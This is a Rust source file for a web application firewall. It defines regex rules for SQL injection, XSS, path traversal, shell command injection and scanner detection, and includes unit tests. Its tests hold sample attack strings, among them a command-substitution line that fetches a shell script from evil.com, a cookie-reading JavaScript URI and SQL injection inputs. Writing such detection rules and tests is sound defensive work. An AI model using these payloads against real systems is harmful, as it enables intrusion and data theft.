use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// WAF Rule Severity Levels (OWASP Standard)
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum Severity {
    Critical = 5,
    Error = 4,
    Warning = 3,
    Notice = 2,
    Info = 1,
}

/// WAF Action to take when rule matches
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum WafAction {
    /// Block the request (return 403)
    Block,
    /// Log the violation but allow request
    Log,
    /// Allow the request (skip remaining rules)
    Allow,
}

/// WAF Detection Rule
#[derive(Debug, Clone)]
pub struct WafRule {
    pub id: u32,
    pub description: String,
    pub pattern: Regex,
    pub severity: Severity,
    pub category: String,
}

/// WAF Rule Match Result
#[derive(Debug, Clone)]
pub struct RuleMatch {
    pub rule_id: u32,
    pub rule_description: String,
    pub severity: Severity,
    pub category: String,
    pub matched_value: String,
    pub location: String, // e.g., "URI", "Header:User-Agent", "Body"
}

/// WAF Configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WafConfig {
    /// Enable/disable WAF
    pub enabled: bool,
    /// Minimum severity to trigger action
    pub min_severity: Severity,
    /// Default action for rule matches
    pub default_action: WafAction,
    /// Custom actions per category
    pub category_actions: HashMap<String, WafAction>,
}

impl Default for WafConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            min_severity: Severity::Warning,
            default_action: WafAction::Block,
            category_actions: HashMap::new(),
        }
    }
}

/// AEGIS Web Application Firewall
///
/// Rust-native WAF implementing OWASP Top 10 protection patterns.
/// Designed for high performance with zero-copy analysis where possible.
///
/// Migration Path: Sprint 13 will refactor this to run in Wasm sandbox
pub struct AegisWaf {
    config: WafConfig,
    rules: Vec<WafRule>,
}

impl AegisWaf {
    /// Create new WAF instance with default OWASP rules
    pub fn new(config: WafConfig) -> Self {
        let rules = Self::build_default_rules();
        Self { config, rules }
    }

    /// Analyze HTTP request and return any rule matches
    pub fn analyze_request(
        &self,
        _method: &str,
        uri: &str,
        headers: &[(String, String)],
        body: Option<&[u8]>,
    ) -> Vec<RuleMatch> {
        if !self.config.enabled {
            return Vec::new();
        }

        let mut matches = Vec::new();

        // Check URI
        for rule in &self.rules {
            if let Some(m) = rule.pattern.find(uri) {
                if rule.severity >= self.config.min_severity {
                    matches.push(RuleMatch {
                        rule_id: rule.id,
                        rule_description: rule.description.clone(),
                        severity: rule.severity,
                        category: rule.category.clone(),
                        matched_value: m.as_str().to_string(),
                        location: "URI".to_string(),
                    });
                }
            }
        }

        // Check headers
        for (name, value) in headers {
            for rule in &self.rules {
                if let Some(m) = rule.pattern.find(value) {
                    if rule.severity >= self.config.min_severity {
                        matches.push(RuleMatch {
                            rule_id: rule.id,
                            rule_description: rule.description.clone(),
                            severity: rule.severity,
                            category: rule.category.clone(),
                            matched_value: m.as_str().to_string(),
                            location: format!("Header:{}", name),
                        });
                    }
                }
            }
        }

        // Check body (if present)
        if let Some(body_bytes) = body {
            if let Ok(body_str) = std::str::from_utf8(body_bytes) {
                for rule in &self.rules {
                    if let Some(m) = rule.pattern.find(body_str) {
                        if rule.severity >= self.config.min_severity {
                            matches.push(RuleMatch {
                                rule_id: rule.id,
                                rule_description: rule.description.clone(),
                                severity: rule.severity,
                                category: rule.category.clone(),
                                matched_value: m.as_str().to_string(),
                                location: "Body".to_string(),
                            });
                        }
                    }
                }
            }
        }

        matches
    }

    /// Determine action to take based on rule matches
    pub fn determine_action(&self, matches: &[RuleMatch]) -> WafAction {
        if matches.is_empty() {
            return WafAction::Allow;
        }

        // Find highest severity match
        let max_severity = matches
            .iter()
            .map(|m| m.severity)
            .max()
            .unwrap_or(Severity::Info);

        // Check for category-specific actions
        for rule_match in matches {
            if let Some(action) = self.config.category_actions.get(&rule_match.category) {
                return *action;
            }
        }

        // Use default action for matches at or above configured severity
        if max_severity >= self.config.min_severity {
            self.config.default_action
        } else {
            WafAction::Log
        }
    }

    /// Build default OWASP-inspired rule set
    ///
    /// Based on OWASP Top 10 and ModSecurity CRS patterns
    fn build_default_rules() -> Vec<WafRule> {
        vec![
            // ============================================
            // SQL Injection (OWASP #1)
            // ============================================
            WafRule {
                id: 942100,
                description: "SQL Injection Attack: Common DB names".to_string(),
                pattern: Regex::new(r"(?i)(union.*select|select.*from|insert.*into|delete.*from|drop.*table|exec.*xp_)").unwrap(),
                severity: Severity::Critical,
                category: "sqli".to_string(),
            },
            WafRule {
                id: 942110,
                description: "SQL Injection: Comment-based injection".to_string(),
                pattern: Regex::new(r"(?i)('(\s*)(or|and)(\s*)'|'\s*--|\s+--\s*$)").unwrap(),
                severity: Severity::Critical,
                category: "sqli".to_string(),
            },
            WafRule {
                id: 942120,
                description: "SQL Injection: MySQL comments and operators".to_string(),
                pattern: Regex::new(r"(?i)(\/\*!|#|--|xp_cmdshell|sp_executesql)").unwrap(),
                severity: Severity::Error,
                category: "sqli".to_string(),
            },

            // ============================================
            // Cross-Site Scripting (OWASP #3)
            // ============================================
            WafRule {
                id: 941100,
                description: "XSS Attack: Script tag injection".to_string(),
                pattern: Regex::new(r"(?i)<script[^>]*>.*?</script>").unwrap(),
                severity: Severity::Critical,
                category: "xss".to_string(),
            },
            WafRule {
                id: 941110,
                description: "XSS Attack: Event handler injection".to_string(),
                pattern: Regex::new(r"(?i)(onerror|onload|onclick|onmouseover)\s*=").unwrap(),
                severity: Severity::Critical,
                category: "xss".to_string(),
            },
            WafRule {
                id: 941120,
                description: "XSS Attack: JavaScript protocol".to_string(),
                pattern: Regex::new(r"(?i)javascript:").unwrap(),
                severity: Severity::Error,
                category: "xss".to_string(),
            },
            WafRule {
                id: 941130,
                description: "XSS Attack: Iframe injection".to_string(),
                pattern: Regex::new(r"(?i)<iframe[^>]*>").unwrap(),
                severity: Severity::Error,
                category: "xss".to_string(),
            },

            // ============================================
            // Path Traversal / LFI (OWASP #1)
            // ============================================
            WafRule {
                id: 930100,
                description: "Path Traversal: ../ patterns".to_string(),
                pattern: Regex::new(r"\.\.\/|\.\.\\").unwrap(),
                severity: Severity::Critical,
                category: "path-traversal".to_string(),
            },
            WafRule {
                id: 930110,
                description: "Path Traversal: /etc/passwd access".to_string(),
                pattern: Regex::new(r"(?i)(\/etc\/passwd|\/etc\/shadow|\.\.\/\.\.\/etc)").unwrap(),
                severity: Severity::Critical,
                category: "path-traversal".to_string(),
            },

            // ============================================
            // Remote Code Execution / Command Injection
            // ============================================
            WafRule {
                id: 932100,
                description: "RCE: Unix shell command injection".to_string(),
                pattern: Regex::new(r"(?i)(;\s*ls|;\s*cat|;\s*wget|;\s*curl|;\s*bash|;\s*sh|\|\s*cat|\|\s*ls|\$\(|&&\s)").unwrap(),
                severity: Severity::Critical,
                category: "rce".to_string(),
            },
            WafRule {
                id: 932110,
                description: "RCE: Windows commands".to_string(),
                pattern: Regex::new(r"(?i)(cmd\.exe|powershell|net\.exe|wscript)").unwrap(),
                severity: Severity::Critical,
                category: "rce".to_string(),
            },

            // ============================================
            // HTTP Protocol Violations
            // ============================================
            WafRule {
                id: 920100,
                description: "HTTP Protocol: Invalid method".to_string(),
                pattern: Regex::new(r"(?i)^(TRACE|TRACK|DEBUG)$").unwrap(),
                severity: Severity::Warning,
                category: "protocol".to_string(),
            },

            // ============================================
            // Scanner/Bot Detection
            // ============================================
            WafRule {
                id: 913100,
                description: "Scanner Detection: Common scanner signatures".to_string(),
                pattern: Regex::new(r"(?i)(nikto|nmap|masscan|sqlmap|dirbuster|acunetix)").unwrap(),
                severity: Severity::Error,
                category: "scanner".to_string(),
            },
        ]
    }

    /// Add custom rule to WAF
    pub fn add_rule(&mut self, rule: WafRule) {
        self.rules.push(rule);
    }

    /// Get WAF statistics
    pub fn get_rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Get rules by category
    pub fn get_rules_by_category(&self, category: &str) -> Vec<&WafRule> {
        self.rules
            .iter()
            .filter(|r| r.category == category)
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sql_injection_detection() {
        let waf = AegisWaf::new(WafConfig::default());

        // Test basic SQL injection patterns
        let attacks = vec![
            "SELECT * FROM users",
            "1' OR '1'='1",
            "admin'--",
            "UNION SELECT password FROM users",
        ];

        for attack in attacks {
            let matches = waf.analyze_request("GET", attack, &[], None);
            assert!(!matches.is_empty(), "Failed to detect: {}", attack);
            assert_eq!(matches[0].category, "sqli");
        }
    }

    #[test]
    fn test_xss_detection() {
        let waf = AegisWaf::new(WafConfig::default());

        let attacks = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<iframe src='http://evil.com'>",
        ];

        for attack in attacks {
            let matches = waf.analyze_request("GET", attack, &[], None);
            assert!(!matches.is_empty(), "Failed to detect: {}", attack);
            assert_eq!(matches[0].category, "xss");
        }
    }

    #[test]
    fn test_path_traversal_detection() {
        let waf = AegisWaf::new(WafConfig::default());

        let attacks = vec![
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
        ];

        for attack in attacks {
            let matches = waf.analyze_request("GET", attack, &[], None);
            assert!(!matches.is_empty(), "Failed to detect: {}", attack);
            assert_eq!(matches[0].category, "path-traversal");
        }
    }

    #[test]
    fn test_rce_detection() {
        let waf = AegisWaf::new(WafConfig::default());

        let attacks = vec![
            ("; ls -la", "rce"),
            ("| cat /tmp/file", "rce"),  // Changed from /etc/passwd to avoid path-traversal match
            ("$(wget http://evil.com/shell.sh)", "rce"),
            ("cmd.exe /c dir", "rce"),
        ];

        for (attack, expected_category) in attacks {
            let matches = waf.analyze_request("GET", attack, &[], None);
            assert!(!matches.is_empty(), "Failed to detect: {}", attack);
            // Find the RCE match (might have multiple matches)
            let rce_match = matches.iter().find(|m| m.category == expected_category);
            assert!(rce_match.is_some(), "No {} match for: {}", expected_category, attack);
        }
    }

    #[test]
    fn test_waf_action_determination() {
        let waf = AegisWaf::new(WafConfig::default());

        // Critical match should block
        let critical_match = RuleMatch {
            rule_id: 1,
            rule_description: "Test".to_string(),
            severity: Severity::Critical,
            category: "sqli".to_string(),
            matched_value: "test".to_string(),
            location: "URI".to_string(),
        };

        let action = waf.determine_action(&vec![critical_match]);
        assert_eq!(action, WafAction::Block);

        // Empty matches should allow
        let action = waf.determine_action(&[]);
        assert_eq!(action, WafAction::Allow);
    }

    #[test]
    fn test_clean_request_passes() {
        let waf = AegisWaf::new(WafConfig::default());

        let clean_requests = vec![
            "/api/users",
            "/static/style.css",
            "/blog/post/123",
        ];

        for uri in clean_requests {
            let matches = waf.analyze_request("GET", uri, &[], None);
            assert!(matches.is_empty(), "False positive for: {}", uri);
        }
    }

    #[test]
    fn test_header_analysis() {
        let waf = AegisWaf::new(WafConfig::default());

        let headers = vec![
            ("User-Agent".to_string(), "nikto scanner".to_string()),
        ];

        let matches = waf.analyze_request("GET", "/", &headers, None);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].category, "scanner");
        assert_eq!(matches[0].location, "Header:User-Agent");
    }
}
